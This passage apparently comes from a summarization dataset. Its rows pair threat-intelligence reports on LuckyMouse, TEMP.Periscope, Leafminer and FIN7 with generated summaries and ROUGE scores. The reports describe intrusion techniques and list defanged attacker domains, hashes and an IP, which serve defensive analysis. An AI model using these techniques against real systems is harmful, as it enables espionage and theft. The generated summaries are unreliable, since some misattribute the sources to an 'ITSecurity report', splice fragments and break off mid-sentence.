with SMBv1 on board. We suspect this router was hacked as part of the campaign in order to process the malware's HTTP requests. The Sonypsps[.]com domain was last updated using GoDaddy on 2017-05-05 until 2019-03-13.In March 2017, Wikileaks published details about an exploit affecting Mikrotik called ChimayRed. According to the documentation, however, it doesn't work for firmware versions higher than 6.30. This router uses version 6.34.There were traces of HyperBro in the infected data center from mid-November 2017. Shortly after that different users in the country started being redirected to the malicious domain update.iaacstudio[.]com as a result of the waterholing of government websites. These events suggest that the data center infected with HyperBro and the waterholing campaign are connected.What did the malware do in the data center?The initial module drops three files that are typical for Chinese-speaking actors: a legit Symantec pcAnywhere (IntgStat.exe) for DLL side loading, a .dll launcher (pcalocalresloader.dll) and the last-stage decompressor (thumb.db). As a result of all these steps, the last-stage Trojan is injected into svchost.exe's process memory.The launcher module, obfuscated with the notorious Metasploit's shikata_ga_nai encoder, is the same for all the droppers. The resulting deobfuscated code performs typical side loading: it patches pcAnywhere's image in memory at its entry point. The patched code jumps back to the decryptor's second shikata_ga_nai iteration, but this time as part of the allowlisted application.This Metasploit's encoder obfuscates the last part of the launcher's code, which in turn resolves the necessary API and maps thumb.db into the same process's (pcAnywhere) memory. The first instructions in the mapped thumb.db are for a new shikata_ga_nai iteration. The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory.What does the resulting watering hole look like?The websites were compromised to redirect visitors to instances of both ScanBox and BEeF. These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer.Users were redirected to https://google-updata[.]tk:443/hook.js, a BEeF instance, and https://windows-updata[.]tk:443/scanv1.8/i/?1, an empty ScanBox instance that answered a small piece of JavaScript code.ConclusionsLuckyMouse appears to have been very active recently. The TTPs for this campaign are quite common for Chinese-speaking actors, where they typically provide new solid wrappers (launcher and decompressor protected with shikata_ga_nai in this case) around their RATs (HyperBro).The most unusual and interesting point here is the target. A national data center is a valuable source of data that can also be abused to compromise official websites. Another interesting point is the Mikrotik router, which we believe was hacked specifically for the campaign. The reasons for this are not very clear: typically, Chinese-speaking actors don't bother disguising their campaigns. Maybe these are the first steps in a new stealthier approach.Some indicators of compromiseDroppers22CBE2B0F1EF3F2B18B4C5AED6D7BB790D0320878946A73749111E6C94BF1525Launcherac337bd5f6f18b8fe009e45d65a2b09bHyperBro in-memory Trojan04dece2662f648f619d9c0377a7ba7c0Domains and IPsbbs.sonypsps[.]comupdate.iaacstudio[.]comwh0am1.itbaydns[.]comgoogle-updata[.]tkwindows-updata[.]tk;The ITSecurity report summarizes an ongoing campaign targeting a national data center in the Central Asia. The choice of target made this campaign especially significant it meant the attackers gained access to a wide range of government resources at one fell swoop. We believe this access was abused, for example, by inserting malicious scripts in the country's official websites in order to conduct watering hole attacks. The operators used the HyperBro Trojan as their laststage inmemory remote administration tool (RAT). The timestamps for these modules are from December 2017 until January 2018. The antidetection launcher and decompressor make extensive use of Metasploit's shikata_ga_nai encoder as well as LZNT1 compression. Kaspersky Lab products detect the different artifacts used in this campaign with the following verdicts: Trojan.Win32.Generic, TrojanDownloader.Win32.Upatre and Backdoor.Win32.HyperBro. A full technical report, IoCs and YARA rules are available from our intelligence reporting service (contact us intelligence@kaspersky.com). The initial infection vector used in the attack against the data center is unclear. Even when we observed LuckyMouse using weaponized documents with CVE201711882 (widely used by Chinesespeaking actors since December 2017), we can't prove they were related to this particular attack. It's possible the actor used a waterhole to infect data center employees. The main C2 used in this campaign is bbs.sonypsps[. ]com, which resolved to IPaddress, that belongs to the Ukrainian ISP network, held by a Mikrotik router using firmware version 6.3;en;{'r': 0.35, 'p': 0.930635838150289, 'f': 0.5086887795981423};{'r': 0.25879396984924624, 'p': 0.8995633187772926, 'f': 0.4019512160421845};{'r': 0.35, 'p': 0.930635838150289, 'f': 0.5086887795981423}
https://www.mandiant.com/resources/blog/chinese-espionage-group-targets-cambodia-ahead-of-elections;Chinese Espionage Group TEMP.Periscope Targets Cambodia Ahead of July 2018 Elections and Reveals Broad Operations Globally;"IntroductionFireEye has examined a range of TEMP.Periscope activity revealing extensive interest in Cambodia's politics, with active compromises of multiple Cambodian entities related to the country's electoral system. This includes compromises of Cambodian government entities charged with overseeing the elections, as well as the targeting of opposition figures. This campaign occurs in the run up to the country's July 29, 2018, general elections. TEMP.Periscope used the same infrastructure for a range of activity against other more traditional targets, including the defense industrial base in the United States and a chemical company based in Europe. Our previous blog post focused on the group's targeting of engineering and maritime entities in the United States.Overall, this activity indicates that the group maintains an extensive intrusion architecture and wide array of malicious tools, and targets a large victim set, which is in line with typical Chinese-based APT efforts. We expect this activity to provide the Chinese government with widespread visibility into Cambodian elections and government operations. Additionally, this group is clearly able to run several large-scale intrusions concurrently across a wide range of victim types.Our analysis also strengthened our overall attribution of this group. We observed the toolsets we previously attributed to this group, their observed targets are in line with past group efforts and also highly similar to known Chinese APT efforts, and we identified an IP address originating in Hainan, China that was used to remotely access and administer a command and control (C2) server.TEMP.Periscope BackgroundActive since at least 2013, TEMP.Periscope has primarily focused on maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities (targeting is summarized in Figure 1). The group has also targeted professional/consulting services, high-tech industry, healthcare, and media/publishing. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting by Proofpoint and F-Secure on ""NanHaiShu.""Figure 1: Summary of TEMP.Periscope activityIncident BackgroundFireEye analyzed files on three open indexes believed to be controlled by TEMP.Periscope, which yielded insight into the group's objectives, operational tactics, and a significant amount of technical attribution/validation. These files were ""open indexed"" and thus accessible to anyone on the public internet. This TEMP.Periscope activity on these servers extends from at least April 2017 to the present, with the most current operations focusing on Cambodia's government and elections.Two servers, chemscalere[.]com and scsnewstoday[.]com, operate as typical C2 servers and hosting sites, while the third, mlcdailynews[.]com, functions as an active SCANBOX server. The C2 servers contained both logs and malware.Analysis of logs from the three servers revealed: Potential actor logins from an IP address located in Hainan, China that was used to remotely access and administer the servers, and interact with malware deployed at victim organizations. Malware command and control check-ins from victim organizations in the education, aviation, chemical, defense, government, maritime, and technology sectors across multiple regions. FireEye has notified all of the victims that we were able to identify.The malware present on the servers included both new families (DADBOD, EVILTECH) and previously identified malware families (AIRBREAK, EVILTECH, HOMEFRY, MURKYTOP, HTRAN, and SCANBOX) .Compromises of Cambodian Election EntitiesAnalysis of command and control logs on the servers revealed compromises of multiple Cambodian entities, primarily those relating to the upcoming July 2018 elections. In addition, a separate spear phishing email analyzed by FireEye indicates concurrent targeting of opposition figures within Cambodia by TEMP.Periscope.Analysis indicated that the following Cambodian government organizations and individuals were compromised by TEMP.Periscope:National Election Commission, Ministry of the Interior, Ministry of Foreign Affairs and International Cooperation, Cambodian Senate, Ministry of Economics and FinanceMember of Parliament representing Cambodia National Rescue PartyMultiple Cambodians advocating human rights and democracy who have written critically of the current ruling partyTwo Cambodian diplomats serving overseasMultiple Cambodian media entitiesTEMP.Periscope sent a spear phish with AIRBREAK malware to Monovithya Kem, Deputy Director-General, Public Affairs, Cambodia National Rescue Party (CNRP), and the daughter of (imprisoned) Cambodian opposition party leader Kem Sokha (Figure 2). The decoy document purports to come from LICADHO (a non-governmental organization [NGO] in Cambodia established in 1992 to promote human rights). This sample leveraged scsnewstoday[.]com for C2.Figure 2: Human right protection survey lureThe decoy document ""Interview Questions.docx"" (MD5: ba1e5b539c3ae21c756c48a8b5281b7e) is tied to AIRBREAK downloaders of the same name. The questions reference the opposition Cambodian National Rescue Party, human rights, and the election (Figure 3).Figure 3: Interview questions decoyInfrastructure Also Used for Operations Against Private CompaniesThe aforementioned malicious infrastructure was also used against private companies in Asia, Europe and North America. These companies are in a wide range of industries, including academics, aviation, chemical, maritime, and technology. A MURKYTOP sample from 2017 and data contained in a file linked to chemscalere[.]com suggest that a corporation involved in the U.S. defense industrial base (DIB) industry, possibly related to maritime research, was compromised. Many of these compromises are in line with TEMP.Periscope's previous activity targeting maritime and defense industries. However, we also uncovered the compromise of a European chemical company with a presence in Asia, demonstrating that this group is a threat to business worldwide, particularly those with ties to Asia.AIRBREAK Downloaders and Droppers Reveal Lure IndicatorsFilenames for AIRBREAK downloaders found on the open indexed sites also suggest the ongoing targeting of interests associated with Asian geopolitics. In addition, analysis of AIRBREAK downloader sites revealed a related server that underscores TEMP.Periscope's interest in Cambodian politics.The AIRBREAK downloaders in Table 1 redirect intended victims to the indicated sites to display a legitimate decoy document while downloading an AIRBREAK payload from one of the identified C2s. Of note, the hosting site for the legitimate documents was not compromised. An additional C2 domain, partyforumseasia[.]com, was identified as the callback for an AIRBREAK downloader referencing the Cambodian National Rescue Party.Redirect Site (Not Malicious) AIRBREAK Downloader AIRBREAK C2 en.freshnewsasia.com/index.php/en/8623-2018-04-26-10-12-46.html TOP_NEWS_Japan_to_Support_the_Election.js (3c51c89078139337c2c92e084bb0904c) [Figure 4] chemscalere[.]com iric.gov.kh/LICADHO/Interview-Questions.pdf [pdf]Interview-Questions.pdf.js (e413b45a04bf5f812912772f4a14650f) iric.gov.kh/LICADHO/Interview-Questions.pdf [docx]Interview-Questions.docx.js (cf027a4829c9364d40dcab3f14c1f6b7) unknown Interview_Questions.docx.js (c8fdd2b2ddec970fa69272fdf5ee86cc) scsnewstoday[.]com atimes.com/article/philippines-draws-three-hard-new-lines-on-china/ Philippines-draws-three-hard-new-lines-on-china .js (5d6ad552f1d1b5cfe99ddb0e2bb51fd7) mlcdailynews[.]com facebook.com/CNR.Movement/videos/190313618267633/ CNR.Movement.mp4.js (217d40ccd91160c152e5fce0143b16ef) Partyforumseasia[.]comTable 1: AIRBREAK downloadersFigure 4: Decoy document associated with AIRBREAK downloader file TOP_NEWS_Japan_to_Support_the_Election.jsSCANBOX Activity Gives Hints to Future OperationsThe active SCANBOX server, mlcdailynews[.]com, is hosting articles related to the current Cambodian campaign and broader operations. Articles found on the server indicate targeting of those with interests in U.S.-East Asia geopolitics, Russia and NATO affairs. Victims are likely either brought to the SCANBOX server via strategic website compromise or malicious links in targeted emails with the article presented as decoy material. The articles come from open-source reporting readily available online. Figure 5 is a SCANBOX welcome page and Table 2 is a list of the articles found on the server.Figure 5: SCANBOX welcome pageCopied Article Topic Article Source (Not Compromised) Leaders confident yet nervous Khmer Times Mahathir_ 'We want to be friendly with China PM urges voters to support CPP for peace CPP determined to maintain Kingdom's peace and development Bun Chhay's wife dies at 60 Crackdown planned on boycott callers Further floods coming to Kingdom Kem Sokha again denied bail PM vows to stay on as premier to quash traitors Iran_ Don't trust Trump Fresh News Kim-Trump summit_ Singapore's role Trump's North Korea summit may bring peace declaration - but at a cost Reuters U.S. pushes NATO to ready more forces to deter Russian threat us-nato-russia_us-pushes-nato-to-ready-more-forces-to-deter-russian-threat Interior Minister Sar Kheng warns of dirty tricks Phnom Penh Post Another player to enter market for cashless pay Donald Trump says he has 'absolute right' to pardon himself but he's done nothing wrong - Donald Trump's America ABC News China-funded national road inaugurated in Cambodia The Cambodia Daily Kim and Trump in first summit session in Singapore Asia Times U.S. to suspend military exercises with South Korea, Trump says U.S. News Rainsy defamed the King_ Hun Sen BREAKING NEWS cambodia-opposition-leader-denied-bail-again-in-treason-case Associated PressTable 2: SCANBOX articles copied to serverTEMP.Periscope Malware SuiteAnalysis of the malware inventory contained on the three servers found a classic suite of TEMP.Periscope payloads, including the signature AIRBREAK, MURKYTOP, and HOMEFRY. In addition, FireEye's analysis identified new tools, EVILTECH and DADBOD (Table 3).Malware Function Details EVILTECH Backdoor EVILTECH is a JavaScript sample that implements a simple RAT with support for uploading, downloading, and running arbitrary JavaScript.During the infection process, EVILTECH is run on the system, which then causes a redirect and possibly the download of additional malware or connection to another attacker-controlled system. DADBOD Credential Theft DADBOD is a tool used to steal user cookies.Analysis of this malware is still ongoing.Table 3: New additions to the TEMP.Periscope malware suiteData from Logs Strengthens Attribution to ChinaOur analysis of the servers and surrounding data in this latest campaign bolsters our previous assessment that TEMP.Periscope is likely Chinese in origin. Data from a control panel access log indicates that operators are based in China and are operating on computers with Chinese language settings.A log on the server revealed IP addresses that had been used to log in to the software used to communicate with malware on victim machines. One of the IP addresses, 112.66.188.28, is located in Hainan, China. Other addresses belong to virtual private servers, but artifacts indicate that the computers used to log in all cases are configured with Chinese language settings.Outlook and ImplicationsThe activity uncovered here offers new insight into TEMP.Periscope's activity. We were previously aware of this actor's interest in maritime affairs, but this compromise gives additional indications that it will target the political system of strategically important countries. Notably, Cambodia has served as a reliable supporter of China's South China Sea position in international forums such as ASEAN and is an important partner. While Cambodia is rated as Authoritarian by the Economist's Democracy Index, the recent surprise upset of the ruling party in Malaysia may motivate China to closely monitor Cambodia's July 29 elections.The targeting of the election commission is particularly significant, given the critical role it plays in facilitating voting. There is not yet enough information to determine why the organization was compromised - simply gathering intelligence or as part of a more complex operation. Regardless, this incident is the most recent example of aggressive nation-state intelligence collection on election processes worldwide.We expect TEMP.Periscope to continue targeting a wide range of government and military agencies, international organizations, and private industry. However focused this group may be on maritime issues, several incidents underscore their broad reach, which has included European firms doing business in Southeast Asia and the internal affairs of littoral nations. FireEye expects TEMP.Periscope will remain a virulent threat for those operating in the area for the foreseeable future.";"TEMP.Periscope has been active since at least 2013, focusing primarily on maritimerelated targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities (targeting is summarized in Figure 1). The group has also targeted professional/consulting services, hightech industry, healthcare, and media/publishing. TEMP.Periscope overlaps in targeting, as well as tactics, techniques, and procedures (TTPs), with TEMP.Jumper, a group that also overlaps significantly with public reporting by Proofpoint and FSecure on ""NanHaiShu. ""Figure 1: Summary of TEMP.Periscope activityIncident BackgroundFireEye analyzed files on three open indexes believed to be controlled by TEMP.Periscope, which yielded insight into the group's objectives, operational tactics, and a significant amount of technical attribution/validation. These files were ""open indexed"" and thus accessible to anyone on the public internet. This TEMP.Periscope activity on these servers extends from at least April 2017 to the present, with the most current operations focusing on Cambodia's government and elections.Two servers, chemscalere[. ]com and scsnewstoday[. ]com, operate as typical C2 servers and hosting sites, while the third, mlcdailynews[. TEMP.Periscope has been targeting Cambodian government organizations and individuals, as well as multiple Cambodian entities, primarily those relating to the upcoming July 2018 elections. In addition, a separate spear phishing email analyzed by FireEye indicates concurrent targeting of opposition figures within Cambodia by TEMP.Periscope. The decoy document purports to come from LICADHO (a nongovernmental organization [NGO] in Cambodia established in 1992 to promote human rights). This sample leveraged scsnewstoday[. ]com for C2. The decoy document ""Interview Questions.docx"" (MD5: ba1e5b539c3ae21c756c48a8b5281b7e) is tied to AIRBREAK downloaders of the same name. The questions reference the opposition Cambodian National Rescue Party, human rights, and the election. Infrastructure Also Used for Operations Against Private Companies The aforementioned malicious infrastructure was also used against private companies in Asia, Europe and North America. These companies are in a wide range of industries, including academics, aviation, chemical, maritime, and technology. A MURKYTOP sample from 2017 and data contained in a file linked to chemscalere[. ]com suggest that a corporation involved in the U.S. defense industrial base (DIB) industry, possibly related to maritime research, was compromised. Many of these compromises are in line with TEMP.Periscope's previous activity targeting maritime and defense industries. However, we also uncovered the compromise of a European chemical company with a presence in Asia, demonstrating that this TEMP.Periscope Malware SuiteAnalysis of the malware inventory contained on the three servers found a classic suite of TEMP.Periscope payloads, including the signature AIRBREAK, MURKYTOP, and HOMEFRY. In addition, FireEye's analysis identified new tools, EVILTECH and DADBOD (Table 3).Malware Function Details EVILTECH Backdoor EVILTECH is a JavaScript sample that implements a simple RAT with support for uploading, downloading, and running arbitrary JavaScript.During the infection process, EVILTECH is run on the system, which then causes a redirect and possibly the download of additional malware or connection to another attackercontrolled system. TEMP.Periscope is a Chinese cyber espionage group that has been targeting maritime affairs, international organizations, and private industry in Southeast Asia. The group has recently targeted the election commission of Cambodia and is likely to continue targeting a wide range of government and military agencies, international organizations, and private industry.";en;{'r': 0.3528722157092614, 'p': 0.9647435897435898, 'f': 0.5167381935031259};{'r': 0.27743142144638405, 'p': 0.9063136456211812, 'f': 0.4248209987978469};{'r': 0.3528722157092614, 'p': 0.9647435897435898, 'f': 0.5167381935031259}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/leafminer-espionage-middle-east;Leafminer: New Espionage Campaigns Targeting Middle Eastern Regions;"This included the Fuzzbunch framework that was part of an infamous leak of exploits and tools by the Shadow Brokers in April 2017. Leafminer has developed exploit payloads for this framework (Table 2) that deliver custom malware through attacks against SMB vulnerabilities described by Microsoft. The EternalBlue exploit from the framework received worldwide attention after being used in the ransomware campaigns WannaCry in May and Petya/NotPetya in June 2017. The Leafminer operators use EternalBlue to attempt lateral movement within target networks from compromised staging servers.Symantec also observed attempts by Leafminer to scan for the Heartbleed vulnerability (CVE-2014-0160) from an attacker-controlled IP address. Furthermore, the Leafminer arsenal server hosted a Python script to scan for this vulnerability.Dictionary attacksAnother intrusion approach used by Leafminer seems a lot less sophisticated than the previously described methods but can be just as effective: using specific hacktools to guess the login passwords for services exposed by a targeted system. This type of attack was observed both via dedicated servers set up by Leafminer as well as staging servers compromised by the group.Commands found in a readme text that was stored in a ZIP archive together with the hacktool THC Hydra in Leafminer's tool arsenal represent online dictionary attacks on Microsoft Exchange and Remote Desktop Protocol services of regional government servers in Saudi Arabia. ""Online"" in this case refers to the attacker using the protocol of the targeted network service to quickly run through many password guesses.Custom malwareSymantec identified two strains of custom malware used by the Leafminer group: Trojan.Imecab and Backdoor.Sorgu. Directly connected to this malware are several sets of reflective loader DLLs used as droppers or to execute specific commands on a compromised system.The development of custom malware by Leafminer as well as some of the tools used for lateral movement show a preference for the .NET framework. We also observed that the attackers would download and install the .NET framework on compromised machines, supposedly in the situation that an operator would have remote access to the system but required .NET to run Leafminer's custom tools. To this end, the command and control (C&C) server operated by the group hosted the legitimate setup executable for Microsoft .NET Framework 2.0 SP2.Backdoor.SorguBackdoor.Sorgu is used by the attackers to provide remote access to the infected machine. The backdoor is installed as a service in the Windows system through a shell command script.Trojan.ImecabThe purpose of Trojan.Imecab is to set up a persistent remote access account on the target machine with a hardcoded password. Variants of the malware were also observed with the filename guester.exe which likely refers to the functionality of adding a powerful guest account to the system.The malware installs itself in the system as a Windows service to achieve persistence and ensure that the guest account remains available to the attacker.Reflective loader DLLsTable 2 gives an overview of the reflective loader DLLs and their purpose:";"The ITSecurity report found that the Leafminer group used a variety of methods to gain access to targeted systems. These included the Fuzzbunch framework that was part of an infamous leak of exploits and tools by the Shadow Brokers in April 2017. Leafminer has developed exploit payloads for this framework (Table 2) that deliver custom malware through attacks against SMB vulnerabilities described by Microsoft. The EternalBlue exploit from the framework received worldwide attention after being used in the ransomware campaigns WannaCry in May and Petya/NotPetya in June 2017. The Leafminer operators use EternalBlue to attempt lateral movement within target networks from compromised staging servers. Symantec also observed attempts by Leafminer to scan for the Heartbleed vulnerability (CVE20140160) from an attackercontrolled IP address. Dictionary attacksAnother intrusion approach used by Leafminer seems a lot less sophisticated than the previously described methods but can be just as effective: using specific hacktools to guess the login passwords for services exposed by a targeted system. This type of attack was observed both via dedicated servers set up by Leafminer as well as staging servers compromised by the group. Commands found in a readme text that was stored in a ZIP archive together with the hacktool THC Hydra in Leafminer's tool arsenal represent online dictionary attacks on Microsoft Exchange and Remote Desktop Protocol services of regional government servers in Saudi Arabia. ""Online"" in this case refers to the attacker using the protocol of the targeted network service to quickly run through many password guesses. Custom malwareSymantec identified two strains of custom malware used";en;{'r': 0.632, 'p': 0.9518072289156626, 'f': 0.7596153798192493};{'r': 0.5206422018348624, 'p': 0.9116465863453815, 'f': 0.6627737180003624};{'r': 0.632, 'p': 0.9518072289156626, 'f': 0.7596153798192493}
https://www.mandiant.com/resources/blog/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation;On the Hunt for FIN7: Pursuing an Enigmatic and Evasive Global Criminal Operation;"On Aug. 1, 2018, the United States District Attorney's Office for the Western District of Washington unsealed indictments and announced the arrests of three individuals within the leadership ranks of a criminal organization that aligns with activity we have tracked since 2015 as FIN7. These malicious actors are members of one of the most prolific financial threat groups of this decade, having carefully crafted attacks targeted at more than 100 organizations. FIN7 is referred to by many vendors as ""Carbanak Group,"" although we do not equate all usage of the CARBANAK backdoor with FIN7. This blog explores the range of FIN7's criminal ventures, the technical innovation and social engineering ingenuity that powered their success, a glimpse into their recent campaigns, their apparent use of a security company as a front for criminal operations, and what their success means for the threat landscape moving forward. With this release, FireEye is also providing technical context, historical indicators, and techniques that organizations can use to hunt for FIN7 behavior enterprise-wide.FIN7 Does the Crime...The threat group is characterized by their persistent targeting and large-scale theft of payment card data from victim systems, which it has monetized at least a portion of through a prominent card shop. But FIN7's financial operations were not limited to card data theft. In some instances, when they encountered and could not obtain payment card data from point of sale (POS) systems secured with end-to-end encryption (E2EE) or point-to-point encryption (P2PE), FIN7 pivoted to target finance departments within their victim organizations.Furthermore, in April 2017, FireEye reported that FIN7 sent spear phishing emails to personnel involved with United States Securities and Exchange Commission (SEC) filings at multiple organizations, providing further insight into FIN7's targeting. These targeted individuals would likely have access to material non-public information that FIN7 actors could use to gain a competitive advantage in stock trading.Diversification of their monetization tactics has allowed the group to impact a wide range of industries beyond those solely associated with payment card industry. During campaigns that FireEye associates with FIN7, victims within the following sectors have been targeted within the United States and Europe:Restaurants *TravelHospitality *EducationCasinos and Gaming *ConstructionEnergy *RetailFinance *TelecommunicationsHigh-tech *GovernmentSoftware *Business servicesFIN7's Innovation Enabled their SuccessThroughout FireEye's tracking of FIN7 campaigns, the attackers have attempted to stay ahead of the game and thwart detection, using novel tactics and displaying characteristics of a well-resourced operation. For example, in April 2017, FireEye blogged about FIN7's spear phishing emails that leveraged hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim. This was a direct departure from their established use of weaponized Office macros and highlighted the group's adaptive nature to evade detection.FireEye also previously reported on FIN7's use of the CARBANAK backdoor as a post-exploitation tool to cement their foothold in a network and maintain access to victim environments. CARBANAK is well known for its use in highly profitable and sophisticated attacks dating back to 2013, with usage attributable to FIN7 beginning in late 2015, although how interconnected the campaigns employing the malware over this five-year span are is unclear. FIN7's use of CARBANAK is particularly notable due to their use of creative persistence mechanisms to launch the backdoor. The group leveraged an application shim database that injected a malicious in-memory patch into the Services Control Manager (""services.exe"") process, and then spawned a CARBANAK backdoor process. FIN7 also used this tactic to install a payment card harvesting utility.Another notable characteristic of FIN7 has been their heavy use of digital certificates. Unsurprisingly, malicious threat actors have sought to exploit the legitimacy afforded by these certificates. By digitally signing their phishing documents, backdoors and later stage tools, FIN7 was able to bypass many security controls that may limit execution of macros from Office documents and restrict execution of unsigned binaries on trusted systems.Organization Country Serial Email Korsar Travel TOV UA 88:21:ac:7e:6c:da:11:00:1d:b3:d3:1a:16:c1:5c:26 korsartravel@bk.ru Kaitschuck James GB 30:2e:7f:14:3a:f3:f3:98:20:70:42:4e:ea:52:5d:d2 oliversoftware@hotmail.com Park Travel RU 4d:e2:87:56:98:bf:c7:74:a3:f3:47:d6:70:7c:9b:f0 inga@parktravel-mx.ruTable 1: Sample FIN7 code signing certificatesFIN7 developed evasive techniques at a rapid pace. Throughout 2017, FIN7 was observed creating novel obfuscation methods, and in some cases modifying the methods on a daily basis while launching attacks targeting multiple victims. The threat group regularly tested malicious DOC, DOCX, and RTF phishing documents against public repositories to check static detection engine coverage. Their development of a payload obfuscation style using the Windows command interpreter's (cmd.exe) native string substitution was so unique that FireEye dubbed it ""FINcoding."" These methods inspired deep command line obfuscation research and the release of Daniel Bohannon's Invoke-DOSfuscation. Reference Table 2 and Table 3 for a selection of samples and their associated command line obfuscation techniques.FIN7's Relentless Phone Calls and BellyachingOver the three years of responding to a multitude of compromises and proactively defending against FIN7, FireEye observed unprecedented social engineering prowess. From leveraging web forms for initial contact to targeting and engaging directly with pre-determined store managers, the operators demonstrated a range of capabilities. FIN7's reach extended beyond their targets' computer systems. FireEye has responded to incidents where FIN7 has called victims prior to lodging digital complaints laden with malicious documents as well as after the phishing documents have been sent, in order to check if they were received - a crude but effective FIN7 email delivery tracking technique.As FIN7 has matured, so did the quality of their phishing lures and templates, which were most often sent from fake but thoroughly disguised individuals and businesses - and occasionally from sender addresses impersonating legitimate government entities. Their phishing has often exploited urgent, high value business matters tailored to their chosen targets. At individual stores, managers were contacted about lost items or sent a ""receipt"" claiming overcharging. Other FIN7 phishing emails masqueraded as detailed catering orders or requests for special menus tailored to individuals with dietary restrictions.In early 2017, a pattern of complaints emerged and has continued for well over a year, where FIN7 has contacted stores and corporate offices to lodge food poisoning complaints with malicious attachments. Internally dubbed ""FINdigestion"" by FireEye, this pattern of detailed complaints eventually expanded beyond individual complaints and into litigious concerns raised on behalf of ""the government"", as shown in Figure 1.Figure 1: FDA themed spear phishing emailIt is noteworthy that the BATELEUR backdoor activity first identified by Proofpoint in July 2017, which FireEye tracks as a suspected FIN7 subgroup, uses highly-customized graphics for their targets, often created in Adobe Photoshop. In this same phishing campaign, FIN7's malicious attachment was graphically themed to match, as shown in Figure 2.Figure 2: FDA themed spear phishing attachmentThroughout their operations, the professional design and continued development of phishing elements in parallel to other post-compromise tools indicated to FireEye that FIN7 was most likely a well-resourced criminal operation.It's Just MetadataFireEye has tracked several FIN7 personas throughout their operations by collecting and parsing filetypes of forensic value for juicy metadata. In a previous blog, we shared how LNK files created by FIN7 unintentionally revealed valuable information about their development environment.LNK files can contain metadata that reveals attributes about the systems on which the LNKs were created, including original file paths, volume serial numbers, MAC addresses, and hostnames. By studying values within the LNK metadata we often identify ""toolmarks,"" or unique values associated with distinct malware developer and operator personas.FIN7 LNK metadata shows that the actors routinely used virtual machines with generic hostnames such as ANDY-PC or USER-PC, and default hostnames with the structure WIN-[A-Z0-9]{11} (e.g. WIN-ABCDEFGH1JK).FireEye has tracked several hostname and path toolmarks associated with FIN7's operations, which we have used to link clusters of threat activity together. These toolmarks may be linked to FIN7 members who are involved in tool development or the broader criminal operation. Notable personas from the technical data, which are explored in more detail in the Technical Appendix section, include:""andy"" / ""andy-pc""""Hass""""jimbo""""??????????"" (Konstantin)""oleg""This analysis allowed us to understand FIN7's systems and correlate future attack activity to the different personas. Furthermore, the metadata analysis helped us monitor for files generated by the group and use the established toolmarks to establish detection for other adversary methodologies (such as direct RDP or SMB access) if the group changed TTPs.Video Playback of FIN7 OperationsWhile responding to multiple FIN7 intrusions, FireEye recovered a custom video recording capability used by FIN7 as a part of their operations. FireEye's FLARE team reverse engineered the video protocol, which appeared to be custom-written by FIN7 as it has no external library dependencies, contained Cyrillic comments in the code, and required the use of a bespoke video player unique to FIN7. The attackers most likely leveraged this video recording capability in their arsenal to monitor operations in victim environments to inform later stages of their intrusions.FireEye obtained a version of the criminal developers' video player from a trusted source and with the knowledge of the reverse engineered protocol, the FLARE team modified the source code to support multiple versions of FIN7's custom encoding. With the patched source code, FireEye can decode and playback FIN7's video monitoring for affected victims in possession of these files.Recent Shifts in FIN7 OperationsThroughout 2018, FireEye has continued to identify multiple domains registered using patterns consistent with prior FIN7 activity, as well as campaigns using disparate TTPs that we have attributed to FIN7 with varying degrees of confidence. ZIP archives delivering the BIRDDOG backdoor were hosted on a portion of suspected FIN7 domains registered in 2018. Some evidence further characterizing the nature of this campaign suggests these malicious documents were sent to financial institution customers in Eastern Europe and Central Asia as early as September 2017. The targeting of individuals rather than organizations would mark a significant shift in their targeting, although it is also possible that the banks spoofed in these campaigns were FIN7's ultimate targets.Additionally, we have identified similarities between FIN7 activity and BATELEUR campaigns, which began as early as mid-2017 and have been primarily aimed at U.S.-based restaurant chains. These campaigns leveraged macro-embedded Word documents directly attached to the emails as well as ones hosted on Google Drive. The documents were meticulously crafted to appear as though they came from legitimate organizations (e.g. restaurant associations and suppliers of POS hardware). This suspected FIN7 activity continued past the date of most recent arrest announced by U.S. law enforcement, although the attackers are now leveraging an updated JavaScript backdoor dubbed GRIFFON.These recent campaigns could be representative of a decisive effort to diversify TTPs to avoid detection or could indicate the formation of FIN7 splinter groups carrying out autonomous campaigns. As a result, organizations need to remain vigilant and continue to monitor for changes in the methods employed by the FIN7 actors.Unveiling FIN7's Front Company and IndustryFigure 3: Combi Security logo as retrieved from 2016 cache of combisecurity.comAccording to U.S. law enforcement, at least a portion of FIN7 activity was run out of a front company dubbed Combi Security. A cache of its website reveals that the company purported to be ""the world leaders in the field of comprehensive protection of large information systems from modern cyber threats"" with headquarters in Moscow, Haifa, and Odessa. We have identified job advertisements for Combi Security that have been posted on popular Russian, Ukrainian, and Uzbek job recruitment sites, as well as numerous individuals who most likely worked for the company. Due to the seeming legitimacy of the recruitment postings, some individuals may have been unaware of illicit nature of their work. While the recruitment of unwitting individuals as puppets has been a common component of at least some criminal schemes - for example, reshipping mules who are recruited through postings on career sites advertising attractive work-from-home jobs - FIN7's veiling of full-scale financial compromises as legitimate offensive security engagements is particularly notable. The apparent success of Combi Security in recruiting unsuspecting individuals in this manner, may lead to more of this type of technical recruitment by cyber criminals in the future.Splitting Up?The criminal organization behind FIN7 is almost certainly comprised of many additional individuals beyond those already apprehended by law enforcement authorities. FireEye iSIGHT Intelligence expects that at least a portion of these malicious actors are likely to continue conducting cyber crime activity in some capacity. Although we expect activity to continue, it is extremely common for threat actors to either modify their TTPs or temporarily halt operations following significant developments such as arrests of high-level members and/or public disclosure of TTPs that they employ.Depending on the organizational and communication structure of the group, it is also plausible that multiple subgroups could form and carry out independent operations in the future. Recent campaigns, as well as those using tactics that were atypical for historical FIN7 campaigns, such as the SEC campaigns with widespread targeting, may be representative of semi-autonomous groups pre-existing within, or cooperating with, the FIN7 criminal organization. As noted in our CARBANAK overview, certain malware families and techniques transcend strictly defined threat groups, and may be re-used by developers and operators as they transition between organizations and campaigns.ConclusionThese recent announcements by U.S. law enforcement highlight the positive impact that can result from synergy between private and public sector organizations in disrupting organized cyber crime operations. As demonstrated by 